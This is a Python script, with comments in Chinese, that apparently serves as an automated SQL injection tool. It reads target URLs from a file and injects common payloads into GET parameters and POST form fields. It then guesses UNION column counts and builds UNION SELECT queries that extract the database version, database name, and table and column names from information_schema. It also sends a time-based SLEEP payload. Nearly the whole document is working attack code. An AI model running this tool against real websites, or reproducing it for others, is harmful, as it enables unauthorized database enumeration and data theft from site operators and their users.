# -*- coding: utf-8 -*-
"""
Created on Tue Nov  5 10:29:11 2019

@author: wang
"""
import os
import sys
import re
import requests
import datetime

from html.parser import HTMLParser
import urllib.request
from urllib.parse import urlparse
from bs4 import BeautifulSoup

t_name = "0204"
fp_ans = open("SQL_injection.txt","w", encoding = "utf-8")
fp_ans.close()

def connetion_is_ok(testURL:str):
    print("目前檢查的 url 為:",testURL)
    response = requests.get(testURL)
    report = response.status_code
    
    #print(type(report))
    if report == 200:
        #print("report =", report)
        return True
    else:
        #print(report)
        fp = open("SQL_injection.txt", "a", encoding = "utf-8")
        fp.write("THIS URL NOT GOOD 404!!")
        fp.write("\n")
        fp.write(testURL)
        fp.write("\n\n")
        return False
def guess_column_number(test_local_URL1:str, union_test_patern:str) -> str: 

    test_local_URL1 = test_local_URL1 + " " + union_test_patern
    return (test_local_URL1, union_test_patern)

def union_injection(local_url:str, whichOne:int, isGET:int, t_url:str):

    # local_url -> get 為 網址
    # local_url -> post 為 腳本
    # 建立一個 Session
    local_same_sid = requests.Session()
    if (isGET == 1):
        local_GetHtmalResponse = local_same_sid.get(local_url)
        
        local_soup = BeautifulSoup(local_GetHtmalResponse.text, "lxml")
        check_table= local_soup.text

    if (isGET == 0):
        Data = {
            name : local_url
        }
        gggURL = testURL
        local_GetHtmalResponse = local_same_sid.post(gggURL, Data)

        local_soup = BeautifulSoup(local_GetHtmalResponse.text, "lxml")
        check_table = local_soup.text

    # 1 = version
    # 2 = database
    # 3 = table
    # 4 = column
    # 5 = ddos
    
    if (whichOne == 1):
        if (check_table.find("VER_FIND=") >=0 ):
            local_fp_ans = open("SQL_injection.txt", "a", encoding = "utf-8") #將結果寫入
            ans_find = "FIND SQL VERSION INJECTION!!!"
            local_fp_ans.write(ans_find)
            local_fp_ans.write("\n")

            index = check_table.find("VER_FIND=")

            ans = "VERSION NAME = "
            while True:
                if (check_table[index] == " "):
                    break

                ans = ans + str(check_table[index])
                index = index + 1
            
            ans = ans.replace("VER_FIND=", " ")
            local_fp_ans.write(ans)
            local_fp_ans.write("\n")
            local_fp_ans.write("URL= ")
            local_fp_ans.write(t_url)
            local_fp_ans.write("\n")
            local_fp_ans.write("\n")
            local_fp_ans.close()

    if (whichOne == 2):
        if (check_table.find("DAD_FIND=") >=0 ):
            local_fp_ans = open("SQL_injection.txt", "a", encoding = "utf-8") #將結果寫入
            ans_find = "FIND SQL DATABASE INJECTION!!!" 
            local_fp_ans.write(ans_find)
            local_fp_ans.write("\n")
            local_fp_ans.write("URL= ")
            local_fp_ans.write(t_url)
            local_fp_ans.write("\n")
            index = check_table.find("DAD_FIND=")

            ans = "DATABASE NAME = "
            while True:
                if (check_table[index] == " "):
                    break

                ans = ans + str(check_table[index])
                index = index + 1
            
            ans = ans.replace("DAD_FIND=", " ")
            local_fp_ans.write(ans)
            local_fp_ans.write("\n")
            local_fp_ans.write("\n")
            local_fp_ans.close()

    if (whichOne == 3):
        if (check_table.find("TAB_FIND=") >=0 ):
            local_fp_ans = open("SQL_injection.txt", "a", encoding = "utf-8") #將結果寫入
            ans_find = "FIND SQL TABLE INJECTION!!!" 
            local_fp_ans.write(ans_find)
            local_fp_ans.write("\n")
            local_fp_ans.write("URL= ")
            local_fp_ans.write(t_url)
            local_fp_ans.write("\n")
            index = check_table.find("TAB_FIND=")

            ans = "TABLE NAME = "
            while True:
                if (check_table[index] == " "):
                    break

                ans = ans + str(check_table[index])
                index = index + 1
            
            ans = ans.replace("TAB_FIND=", " ")
            local_fp_ans.write(ans)
            local_fp_ans.write("\n")
            local_fp_ans.write("\n")
            local_fp_ans.close()

            local_index1 = ans.find("=")
            local_index2 = ans.find(",")
            global t_name
            t_name = ans[local_index1+1:local_index2]

    if (whichOne == 4):
        if (check_table.find("COL_FIND=") >=0 ):
            local_fp_ans = open("SQL_injection.txt", "a", encoding = "utf-8") #將結果寫入
            ans_find = "FIND SQL COLUMN INJECTION!!!" 
            local_fp_ans.write(ans_find)
            local_fp_ans.write("\n")
            local_fp_ans.write("URL= ")
            local_fp_ans.write(t_url)
            local_fp_ans.write("\n")
            index = check_table.find("COL_FIND=")

            ans = "COLUMN NAME = "
            while True:
                if (check_table[index] == " "):
                    break

                ans = ans + str(check_table[index])
                index = index + 1

            ans = ans.replace("COL_FIND=", " ")
            local_fp_ans.write(ans)
            local_fp_ans.write("\n")
            local_fp_ans.write("\n")
            local_fp_ans.close()

    if (whichOne == 5):
        
        if (t_name != "0204"):

            #print(t_name)
            local_url = local_url.replace("t_name", t_name)

            # local_url -> get 為 網址
            # local_url -> post 為 腳本
            # 建立一個 Session
            local_same_sid = requests.Session()
            if (isGET == 1):
                local_GetHtmalResponse = local_same_sid.get(local_url)
                check_time = local_GetHtmalResponse.elapsed

            if (isGET == 0):
                Data = {
                    name : local_url
                }
                gggURL = testURL 
                local_GetHtmalResponse = local_same_sid.post(gggURL, Data)
                check_time = local_GetHtmalResponse.elapsed

            if str(check_time) > "0:00:01.000000":
                print("DDOS")
                local_fp_ans = open("SQL_injection.txt","a", encoding = "utf-8")
                ans_find = "FIND SQL DDOS INJECTION!!!"
                local_fp_ans.write(ans_find)
                local_fp_ans.write("\n")
                local_fp_ans.write("URL= ")
                local_fp_ans.write(t_url)
                local_fp_ans.write("\n")
                local_fp_ans.close()
            else:
                print("no DDOS")
        else:
            print("no DDOS")
    
#def ddos_injection() -> str:


def query_version_ToPatern(local_url:str) -> str:
    
    p1 = "group_concat(SUBSTRING('VER_FIND=',1),version())"

    j = 49 # 用來轉十進制
    for i in range(1,11):

        index = local_url.find(chr(j)) # 把 1,2,3,....換掉
        j = j + 1
        if index == -1:
            j = 49
            break
        local_url = local_url.replace(local_url[index], p1)
    return local_url

def query_database_ToPatern(local_url:str) -> str:

    p1 = "group_concat(SUBSTRING('DAD_FIND=',1),database())"

    j = 49 # 用來轉十進制
    for i in range(1,11):

        index = local_url.find(chr(j)) # 把 1,2,3,....換掉
        j = j + 1
        if index == -1:
            j = 49
            break
        local_url = local_url.replace(local_url[index], p1)
    return local_url

def query_tableName_ToPatern(local_url:str) -> str:

    p1 = "group_concat(SUBSTRING('TAB_FIND=',1),table_name)"
    p2 = "from information_schema.tables WHERE table_schema=database() -- ' "

    index = local_url.find('-')
    local_url = local_url[0:index] # 把後面 - 符號給去掉
    j = 49 # 用來轉十進制
    for i in range(1,11):

        index = local_url.find(chr(j)) # 把 1,2,3,....換掉
        j = j + 1
        if index == -1:
            j = 49
            break
        local_url = local_url.replace(local_url[index], p1)
        
    local_url = local_url + " " + p2
    return local_url

def query_columnName_ToPatern(local_url:str) -> str:

    p1 = "group_concat(SUBSTRING('COL_FIND=',1),column_name)"
    p2 = "from information_schema.columns WHERE table_schema=database() -- '"

    index = local_url.find('-')
    local_url = local_url[0:index]

    j = 49 # 用來轉十進制
    for i in range(1,11):

        index = local_url.find(chr(j)) # 把 1,2,3,....換掉
        j = j + 1
        if index == -1:
            j = 49
            break
        local_url = local_url.replace(local_url[index], p1)

    local_url = local_url + " " + p2
    return local_url

def query_DDOS_ToPatern(local_url:str) -> str:
    
    index = local_url.find("-")
    local_url = local_url[:index-1]+" FROM t_name WHERE SLEEP(5) -- -' "
    return local_url


'''上面是function'''

fp_allURL = open("allURL.txt", "r+", encoding = "utf-8")
while True:
    testURL = fp_allURL.readline()
    testURL = testURL.strip()
    rightURL = testURL
    testURL_fortest = testURL
    testURL_forCommen_post = testURL
    testURL_forUnion_post = testURL
    #fp.close()
    if not testURL:
        fp_allURL.close()
        fp_ans = open("SQL_injection.txt", "a", encoding= "utf-8")
        fp_ans.write("~結束~")
        fp_ans.close()
        print("allURL.txt are all tested!!!! END")
        sys.exit(0)
        break

    print("目前從 allURL.txt 讀出來的 url 為:",testURL)
    
    if (connetion_is_ok(testURL)):
        # 確認 URL 狀態為 200
        # testURL = "http://127.0.0.1/sql.html"
        # 開始做SQL

        # 建立一個 Session
        same_sid = requests.Session()
        GetHtmlResponse = same_sid.get(testURL)

        soup = BeautifulSoup(GetHtmlResponse.text, "lxml")
        tag_input = soup.find_all('input',attrs={'name':True})

        tag_form_GET1 = soup.find_all('form', attrs={'method':'get'})
        tag_form_GET2 = soup.find_all('form', attrs={'method':'GET'})
        tag_form_POST1 = soup.find_all('form', attrs={'method':'post'})
        tag_form_POST2 = soup.find_all('form', attrs={'method':'POST'})
        tag_form = soup.find_all('form')

        # 開始對對目前 testURL 進行一般符號的注入 用 GET
        fp_common = open("common_sqli.txt", "r", encoding = "utf-8")
        while True:
            chk = 0
            common_sql_injection = fp_common.readline()
            common_sql_injection = common_sql_injection.rstrip()
            if not common_sql_injection:
                print("common_sqli.txt are all tested!!!! END")
                fp_common.close()
                break
            
            find_php = testURL.find("?")
            if( find_php != -1 ):
                php_value = testURL.find("=")
                #print("=========================")
                #print(common_sql_injection)
                #print("=========================")
                #print(php_value)
                #print("=========================")
                testURL = testURL.split('=',1)[0] + "=1" + common_sql_injection + testURL.split('=',1)[1]
                #print(testURL)
                #print("=========================")
                CheckmodifyHtml = same_sid.get(testURL)
                soup1 = BeautifulSoup(CheckmodifyHtml.text, "lxml")
                testURL = rightURL
                if ( soup != soup1):
                    chk = chk+1
                    if( chk>=20 ):
                        f_sqli = open("SQL_injection.txt", "a", encoding= "utf-8")
                        f_sqli.write("FIND COMMON SQL Injection!!!")
                        f_sqli.write("\n")
                        f_sqli.write("URL = ")
                        f_sqli.write(rightURL)
                        f_sqli.write("\n")
                        f_sqli.close()
                        break
        # 對目前 testURL GET 注入完成
        # 開始對目前 testURL 進行一般符號的注入 用 POST
            chk = 0
            for out in tag_input:
                name = out['name']
                Postion = out # 紀錄腳本 e.g. " ' OR  '1' = '1' --  "

                print("prepare to write in Data post common test=",common_sql_injection)
                
                Data = {
                    name : common_sql_injection
                }

                for out in tag_form:
                    checknum = out.get('action')
                    if checknum is None:
                        continue
                    #else:
                        #testURL_forCommen_post = testURL + checknum

                print(testURL_forCommen_post)
                CheckmodifyHtml = same_sid.post(testURL_forCommen_post, Data) #將修改過的data重新 post
                soup1 = BeautifulSoup(CheckmodifyHtml.text, "lxml")
                if ( soup != soup1):
                    chk = chk+1
                    if( chk>=20 ):
                        f_sqli = open("SQL_injection.txt", "a", encoding= "utf-8")
                        f_sqli.write("FIND COMMON SQL Injection!!!")
                        f_sqli.write("\n")
                        f_sqli.write("URL = ")
                        f_sqli.write(rightURL)
                        f_sqli.write("\n")
                        f_sqli.close()
                        break
        print("finish common sqli\n")
        fp_common.close()
        #print(11111)                   
        #os.system("pause")
        # 對目前 testURL 一般注入結束 用 post
        # 開始對目前 testURL 進行 union columne 的猜測注入 用 get
        # 先判斷是否加入 ' 會有錯誤回應 有表示可以接受特殊符號

        testURL_fortest = testURL + " ' " 
        CheckmodifyHtml = same_sid.get(testURL_fortest)

        if (GetHtmlResponse.text != CheckmodifyHtml.text):
            # 確定 目前 testURL 可能有sql 注入
            # 對目前 testURL 進行欄位猜測注入 用 GET

            fp_union_test = open("union_test.txt","r", encoding = "utf-8")
            while True:
                union_test_patern = fp_union_test.readline()
                union_test_patern = union_test_patern.strip()
                if not union_test_patern:
                    print("union_test.txt are all tested for GET !!! END")
                    fp_union_test.close()
                    break

                (get_union_guess_Url, get_union_patern) = guess_column_number(testURL, union_test_patern) #拿到的 URL 是猜此頁面的欄位有幾個
                
                print("猜測 URL 上面的欄位的完整攻擊腳本URL=",get_union_guess_Url)

                CheckmodifyHtml = same_sid.get(get_union_guess_Url)
                soup_union_test = BeautifulSoup(CheckmodifyHtml.text, "lxml")

                NOfind_waring = CheckmodifyHtml.text.find("Warning: mysql_fetch_array() expects parameter 1")<0
                NOfind_syntax = CheckmodifyHtml.text.find("You have an error in your SQL syntax")<0

                if ((NOfind_waring == True) and (NOfind_syntax == True)):
                    # 有 sql 注入 並且注入後網頁也是正常的 (未出現 warning & 未出現 syntax)
                    # 已經找到此 testURL 有幾個欄位
                    # 開始進行 union & ddos 注入

                    ok_union_patern = get_union_patern # e.g and true=false UNION SELECT 1,2,3 -- - '

                    print("得到正確欄位的攻擊 patern 用 GET=",ok_union_patern)
                    
                    testURL_forUnion = testURL + " " + query_version_ToPatern(ok_union_patern)
                    #print("afadsf=",testURL_forUnion)
                    union_injection(testURL_forUnion,1,1,testURL)

                    testURL_forUnion = testURL + " " + query_database_ToPatern(ok_union_patern)
                    #print("afadsf=",testURL_forUnion)
                    union_injection(testURL_forUnion,2,1,testURL)
                    
                    testURL_forUnion = testURL + " " + query_tableName_ToPatern(ok_union_patern)
                    #print("afadsf=",testURL_forUnion)
                    union_injection(testURL_forUnion,3,1,testURL)
                    
                    testURL_forUnion = testURL + " " + query_columnName_ToPatern(ok_union_patern)
                    #print("afadsf=",testURL_forUnion)
                    union_injection(testURL_forUnion,4,1,testURL)

                    testURL_forUnion = testURL + " " + query_DDOS_ToPatern(ok_union_patern)      #e.g. and 1=2 union (SELECT 1,2,3,4 FROM injection_test_table WHERE SLEEP(5)) -- '
                    union_injection(testURL_forUnion,5,1,testURL)
                    
        if (GetHtmlResponse.text == CheckmodifyHtml.text):
            print("not warning get union url ")

        #print("2222222222")
        #os.system("pause")
        # 對目前 testURL 進行 POST 猜測
        if (len(tag_form)>0):
            # 表示目前 testURL 有可以 input 的表單
            #if ( (len(tag_form_GET1)>0) or (len(tag_form_GET2)>0) ):
                # 表示目前 testURL 需進行 get form

            if ( (len(tag_form_POST1)>0) or (len(tag_form_POST2)>0) ):

                # 表示目前 testURL 需進行 post form 注入的檢查 e.g. injection => '
                for out in tag_input:
                    name = out['name']
                    Postion = out 

                    print("prepare to write in Data for union post ' test =","\'")
                    union_test_injection = "'" # post form 注入的檢查
                    
                    Data = {
                        name : union_test_injection
                    }

                    for out in tag_form:
                        checknum = out.get('action')
                        if checknum is None:
                            continue
                        #else:
                            #testURL_fortest = testURL + checknum

                    #print("表單 POST 測試帶入的URL=",testURL_fortest)
                    CheckmodifyHtml = same_sid.post(testURL_fortest, Data) #將修改過的data重新 post

                    if (GetHtmlResponse.text != CheckmodifyHtml.text):
                        # 標示目前 tsetURL 有post表單可以進行注入
                        # 對目前 testURL 進行欄位猜測注入 用 POST
                        fp_union_test = open("union_test.txt","r", encoding = "utf-8")
                        while True:
                            union_test_patern = fp_union_test.readline()
                            union_test_patern = union_test_patern.strip()
                            if not union_test_patern:
                                print("union_test.txt are all tested for POST !!! END")
                                fp_union_test.close()
                                break
                            
                            print("prepare to write in Data for union post column test =", union_test_patern)

                            Data = {
                                name : union_test_patern
                            }

                            for out in tag_form:
                                checknum = out.get('action')
                                if checknum is None:
                                    continue
                                #else:
                                    #testURL_forUnion_post = testURL + checknum

                            #print("表單 POST 測試找欄位的URL=",testURL_forUnion_post)
                            CheckmodifyHtml = same_sid.post(testURL_forUnion_post, Data) #將修改過的data重新 post
                            soup_union_test = BeautifulSoup(CheckmodifyHtml.text, "lxml")

                            NOfind_waring = CheckmodifyHtml.text.find("Warning: mysql_fetch_array() expects parameter 1")<0
                            NOfind_syntax = CheckmodifyHtml.text.find("You have an error in your SQL syntax")<0

                            if ((NOfind_waring == True) and (NOfind_syntax == True)):
                                # 有 sql 注入 並且注入後網頁也是正常的 (未出現 warning & 未出現 syntax)
                                # 已經找到此 testURL 有幾個欄位
                                # 開始進行 union & ddos 注入

                                ok_union_patern = union_test_patern # e.g and true=false UNION SELECT 1,2,3 -- - '

                                testURL_forUnion = query_version_ToPatern(ok_union_patern)
                                union_injection(testURL_forUnion,1,0,testURL)

                                testURL_forUnion = query_database_ToPatern(ok_union_patern)
                                union_injection(testURL_forUnion,2,0,testURL)

                                testURL_forUnion = query_tableName_ToPatern(ok_union_patern)
                                union_injection(testURL_forUnion,3,0,testURL)

                                testURL_forUnion = query_columnName_ToPatern(ok_union_patern)
                                union_injection(testURL_forUnion,4,0,testURL)

                                testURL_forUnion= query_DDOS_ToPatern(get_union_guess_Url)      #e.g. and 1=2 union (SELECT 1,2,3,4 FROM injection_test_table WHERE SLEEP(5)) -- '
                                union_injection(testURL_forUnion,5,0,testURL)
               
                    if (GetHtmlResponse.text == CheckmodifyHtml.text):
                        # 標示目前 tsetURL 有post表單注入 無效
                        print("not warning post union url ")      
        
        


            
        



        
                
                
